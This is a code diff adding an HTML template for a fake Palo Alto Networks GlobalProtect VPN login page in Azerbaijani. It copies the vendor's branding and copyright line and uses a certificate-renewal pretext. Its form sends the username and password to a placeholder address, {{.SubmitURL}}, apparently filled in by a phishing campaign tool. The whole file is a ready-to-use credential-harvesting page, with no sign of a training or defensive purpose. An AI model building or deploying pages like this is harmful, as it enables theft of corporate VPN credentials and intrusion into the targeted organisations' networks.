@@ -1,0 +1,52 @@
+<!doctype html>
+<html lang="az">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>GlobalProtect Portal</title>
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;font-family:'Segoe UI',Roboto,Arial,sans-serif;
+       background:#12141c;background-image:radial-gradient(circle at 50% 0%,#1e2433,#0d0f16);
+       color:#e7ebf2;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
+  .card{width:100%;max-width:392px;background:#ffffff;color:#1b2733;border-radius:14px;
+        box-shadow:0 20px 60px rgba(0,0,0,.45);overflow:hidden}
+  .brand{text-align:center;padding:34px 32px 10px}
+  .brand svg{width:46px;height:46px}
+  .brand h1{margin:12px 0 2px;font-size:19px;font-weight:700;color:#1a1d29}
+  .brand .sub{font-size:12.5px;color:#8a97a5;letter-spacing:.4px}
+  .body{padding:14px 34px 30px}
+  label{display:block;font-size:12.5px;font-weight:600;color:#43596b;margin:16px 0 6px}
+  input{width:100%;padding:12px 14px;font-size:15px;border:1px solid #d3dde6;border-radius:9px;outline:none;transition:.15s}
+  input:focus{border-color:#fa582d;box-shadow:0 0 0 3px rgba(250,88,45,.14)}
+  .btn{width:100%;margin-top:22px;padding:13px;font-size:15px;font-weight:600;color:#fff;
+       background:#fa582d;border:none;border-radius:9px;cursor:pointer;transition:.15s}
+  .btn:hover{background:#e0481f}
+  .note{margin-top:16px;font-size:12px;color:#5f7183;text-align:center;line-height:1.5}
+  .foot{text-align:center;font-size:11px;color:#9aa4b2;padding:16px;background:#f6f8fb;border-top:1px solid #eef1f5}
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="brand">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 2L4 5v6c0 5 3.4 8.4 8 11 4.6-2.6 8-6 8-11V5l-8-3z" fill="#fa582d"/>
+        <path d="M9.3 12.2l1.8 1.8 3.8-3.8" stroke="#fff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+      <h1>GlobalProtect Portal</h1>
+      <div class="sub">Təhlükəsiz VPN Girişi</div>
+    </div>
+    <div class="body">
+      <form action="{{.SubmitURL}}" method="post" autocomplete="off">
+        <label for="u">İstifadəçi adı</label>
+        <input id="u" name="username" type="text" placeholder="ad.soyad" required autofocus>
+        <label for="p">Parol</label>
+        <input id="p" name="password" type="password" placeholder="••••••••" required>
+        <button class="btn" type="submit">Daxil ol</button>
+      </form>
+      <p class="note">Sertifikatınızı yeniləmək üçün korporativ hesabınızla təsdiqlənin.</p>
+    </div>
+    <div class="foot">© 2026 Palo Alto Networks · GlobalProtect™</div>
+  </div>
+</body>
+</html>
